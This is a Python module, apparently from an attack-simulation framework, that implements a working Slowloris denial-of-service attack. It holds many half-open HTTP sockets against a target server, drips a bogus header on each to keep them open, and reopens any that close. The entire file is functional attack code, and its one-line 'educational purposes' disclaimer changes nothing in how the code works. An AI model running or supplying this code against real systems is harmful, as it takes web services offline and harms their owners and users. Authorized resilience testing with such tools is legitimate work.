"""
SlowLorisAttack.py

Implements a Slow-Loris denial-of-service attack.

Parameter summary
+-------------------+-------+-----------------------------------------------+
| parameter         | type  | default / purpose                             |
+-------------------+-------+-----------------------------------------------+
| target_port       | int   | 80   - TCP port of the HTTP server            |
| duration          | int   | 10   - total runtime of the attack (seconds)  |
| connection_count  | int   | 50   - half-open sockets to keep alive        |
+-------------------+-------+-----------------------------------------------+

DISCLAIMER:
This tool is designed strictly for educational purposes and controlled network security testing.
"""

import socket
import time

from attacks.attack import Attack


class SlowLorisAttack(Attack):
    """Keeps many partial HTTP connections open to exhaust the server's worker pool."""

    # ------------------------------------------------------------------ #
    def execute(self) -> None:
        """Open/maintain `connection_count` sockets for `duration` seconds."""
        self.wait_until_start()

        port = int(self.parameters.get("target_port", 80))
        duration = int(self.parameters.get("duration", 10))
        conn_cnt = int(self.parameters.get("connection_count", 50))

        self._slowloris(self.target_ip, port, duration, conn_cnt)

    # ------------------------------------------------------------------ #
    @staticmethod
    def _slowloris(target_ip: str, target_port: int, duration: int, conn_cnt: int) -> None:
        """
        Maintain *conn_cnt* half-open HTTP sockets for *duration* seconds.

        A socket is considered “alive” when at least the request line and Host
        header are sent.  Every few seconds we drip an extra header so the
        server keeps the connection open.
        """
        def open_socket() -> socket.socket | None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                s.sendall(
                    b"GET / HTTP/1.1\r\n"
                    b"Host: " + target_ip.encode() + b"\r\n"
                )
                return s
            except Exception:
                return None

        sockets: list[socket.socket] = []

        # --- build initial pool ---------------------------------------- #
        for _ in range(conn_cnt):
            sock = open_socket()
            if sock:
                sockets.append(sock)

        stop_time = time.time() + duration

        # --- keep-alive loop ------------------------------------------ #
        try:
            while time.time() < stop_time:
                # send one bogus header on every open socket
                for s in list(sockets):          # operate on copy
                    try:
                        s.sendall(b"X-a: b\r\n")
                    except Exception:            # closed / reset by peer
                        sockets.remove(s)
                        try:
                            s.close()
                        except Exception:
                            pass

                # replenish lost sockets
                while len(sockets) < conn_cnt and time.time() < stop_time:
                    ns = open_socket()
                    if ns:
                        sockets.append(ns)

                time.sleep(5)                    # 5-second drip interval
        finally:
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass
